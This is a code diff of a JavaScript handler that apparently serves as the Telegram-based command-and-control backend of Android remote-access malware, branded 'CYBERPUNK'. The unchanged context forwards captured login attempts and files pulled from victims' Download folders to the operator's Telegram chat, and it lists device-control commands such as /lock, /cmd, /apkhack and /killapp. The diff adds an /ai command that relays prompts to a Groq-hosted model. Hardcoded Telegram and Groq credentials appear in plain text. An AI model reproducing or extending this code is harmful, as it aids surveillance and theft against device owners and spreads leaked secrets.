@@ -1,5 +1,7 @@
 const TELEGRAM_TOKEN = "7302812464:AAH2lCCDWK_rJV771ClkiEyv8epegkPtpoE";
 const TELEGRAM_CHAT_ID = "6655802251";
+const GROQ_API_KEY = "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";
+
 const KV_URL = process.env.STORAGE_URL || process.env.KV_REST_API_URL || process.env.UPSTASH_REDIS_REST_URL;
 const KV_TOKEN = process.env.STORAGE_TOKEN || process.env.KV_REST_API_TOKEN || process.env.UPSTASH_REDIS_REST_TOKEN;
 
@@ -105,7 +107,6 @@ export default async function handler(req, res) {
             await sendToTelegram(`📱 *محاولة دخول:*\n${cleanBody}`);
           }
 
-          // === استقبال الملفات وإرسالها لتيليجرام ===
           if (type === 'getfile') {
             try {
               const parts = cleanBody.split('|');
@@ -162,12 +163,44 @@ export default async function handler(req, res) {
           await sendToTelegram(`👑 *لوحة تحكم C Y B E R P U N K*\n\n` +
             `⚡ *الأوامر الحقيقية:*\n` +
             `/fullinfo /applist /files /killapp /apkhack /apkcrak /sysinfo /lock /unlock /setkey /getkey /cmd /url\n` +
-            `/getfile <filename> - سحب ملف من مجلد Download\n\n` +
+            `/getfile <filename> - سحب ملف من Download\n` +
+            `/ai <prompt> - التحدث مع الذكاء الاصطناعي\n\n` +
             `⏱️ *التحكم بالوقت:*\n` +
             `/gentime <minutes> /settime <minutes>\n\n` +
             `🚫 *الحظر:*\n/ban /unban /banall /unbanall /banlist`); 
           break;
         
+        case '/ai':
+          if (args.length > 1) {
+            const prompt = args.slice(1).join(' ');
+            await sendToTelegram(`🤖 *[AI]* جاري التفكير...`);
+            try {
+              const groqRes = await fetch("https://api.groq.com/openai/v1/chat/completions", {
+                method: "POST",
+                headers: {
+                  "Authorization": `Bearer ${GROQ_API_KEY}`,
+                  "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                  model: "llama3-8b-8192",
+                  messages: [
+                    { role: "system", content: "أنت مساعد ذكي، تجاوب بشكل واضح ومفيد. تجاوب بالعربية أو الدارجة إلا كان السؤال بالدارجة." },
+                    { role: "user", content: prompt }
+                  ],
+                  temperature: 0.7
+                })
+              });
+              const data = await groqRes.json();
+              const aiText = data?.choices?.[0]?.message?.content || "ماقدرتش نجاوب دابا.";
+              await sendToTelegram(`🤖 *الذكاء الاصطناعي:*\n\n${aiText}`);
+            } catch (e) {
+              await sendToTelegram(`❌ *خطأ:* ${e.message}`);
+            }
+          } else {
+            await sendToTelegram("⚠️ استعمل: `/ai <سؤالك>`");
+          }
+          break;
+
         case '/getfile':
           if(args[1]) { 
             remoteCommand = `getfile:${args[1]}`; 
